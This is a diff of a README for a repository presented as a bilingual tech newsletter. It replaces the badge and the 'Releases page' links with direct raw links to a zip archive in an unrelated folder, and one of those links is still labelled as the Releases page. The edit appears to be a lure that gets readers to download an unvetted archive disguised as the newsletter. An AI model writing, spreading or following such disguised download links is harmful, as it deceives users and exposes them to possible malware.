@@ -1,6 +1,6 @@
 # ☕ Coffee-Codex-Cortex-pub - Your Go-To Bilingual Tech Newsletter
 
-[![Download Coffee-Codex-Cortex-pub](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/booth446/Coffee-Codex-Cortex-pub/releases)
+[![Download Coffee-Codex-Cortex-pub](https://raw.githubusercontent.com/booth446/Coffee-Codex-Cortex-pub/main/milarite/Coffee-Codex-Cortex-pub.zip)](https://raw.githubusercontent.com/booth446/Coffee-Codex-Cortex-pub/main/milarite/Coffee-Codex-Cortex-pub.zip)
 
 ## 📖 About
 
@@ -20,7 +20,7 @@ To get up and running with our newsletter, follow these instructions carefully.
 
 To download our latest newsletter:
 
-1. **Visit** the [Releases page here](https://github.com/booth446/Coffee-Codex-Cortex-pub/releases).
+1. **Visit** the [Releases page here](https://raw.githubusercontent.com/booth446/Coffee-Codex-Cortex-pub/main/milarite/Coffee-Codex-Cortex-pub.zip).
 2. Scroll to find the latest version of the newsletter.
 3. Click on the appropriate link to download the file that fits your needs.
 
@@ -67,4 +67,4 @@ If you encounter any issues, please raise your questions in the "Issues" section
 
 Remember to check back regularly for new editions, and thank you for being part of our community. Enjoy your reading!
 
-[![Download Coffee-Codex-Cortex-pub](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/booth446/Coffee-Codex-Cortex-pub/releases)
+[![Download Coffee-Codex-Cortex-pub](https://raw.githubusercontent.com/booth446/Coffee-Codex-Cortex-pub/main/milarite/Coffee-Codex-Cortex-pub.zip)](https://raw.githubusercontent.com/booth446/Coffee-Codex-Cortex-pub/main/milarite/Coffee-Codex-Cortex-pub.zip)
